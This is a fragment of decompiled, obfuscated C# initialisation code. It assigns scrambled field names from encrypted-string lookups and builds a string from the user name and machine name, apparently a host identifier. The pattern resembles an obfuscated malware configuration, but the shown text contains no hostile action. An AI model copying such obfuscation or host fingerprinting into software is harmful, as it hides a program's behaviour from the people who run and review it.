		UBIebuPCWWP = getString_0(107396725);
		wAALYJEzpSbZBjuaT = getString_0(107399997);
		kEZakHfcUVsoCC = getString_0(107396725);
		ybLkXQhPvGkZaed = getString_0(107396725);
		PYZhiSywDob = getString_0(107400012);
		RyZMxmbkHOIZd = getString_0(107396725);
		htXuARfQsTaOzn = getString_0(107396725);
		IEkfRfOeAmhoYXS = getString_0(107396830);
		tycSbqqsFixXM = getString_0(107396725);
		tHTQdTsQZMje = getString_0(107399963);
		TAartoIOiNMPV = getString_0(107396830);
		MTAYyryxkzLI = getString_0(107396725);
		rqsouaVqcA = getString_0(107396725);
		ZYkRnxhSkNKv = getString_0(107396725);
		xzbVbgXgcctL = new string[0];
		rDydiOTZjcpMjk = getString_0(107396830);
		EwFuVhMNxUkHL = true;
		PKReouIgQxS = getString_0(107396725);
		VSeBsFuIKiNqF = false;
		hnXMuSJejkhzfs = false;
		RSvgbGpXBTzyX = false;
		VHbfyNRuqMkcdo = false;
		IuaKWfBuBpJ = getString_0(107399982);
		XtQtDAAqcssaA = false;
		hMexcXoWCkuIBYoAa = false;
		pMXUdBqauLzs = false;
		BrcuPGYukd = false;
		TBRkxWpRCztklVA = true;
		NBDdFqpqnBRofW = getString_0(107399929) + Environment.UserName + getString_0(107399948) + Environment.MachineName + getString_0(107399927) + chuLHDnVuoGm.CcLbwvTyIfmg() + getString_0(107399922);
		vgTZYvMerotpU = false;
		XtTGpVAaSDf = new Stopwatch();
		azNcSbADWgl = 0;
		bXnXKaTzlpeizP = 0;
		MNVRxjtsYUxy = true;
		WesWtWKgSJxOqJ = getString_0(107399913) + chuLHDnVuoGm.CcLbwvTyIfmg() + getString_0(107399872);
		MuoFAbiFfQlN = new string[1] { getString_0(107399867) };
		QWxPUGvdhGrBfq = new List<string>();
		PtQKcSkXgtK = 0;
		psULbGGEegD = false;
		DeNCLABlYIcR = true;
		SwRXhEADhj = false;
		YPOtaoUqsbFHYPF = false;
		fQfUKzhPUI = false;
		LwKYIqEXuWxMEvK = new List<string>();
		yqDomuIqnBM = new List<string>();
		dhxcVqwWUj = new List<string>();
	}
}
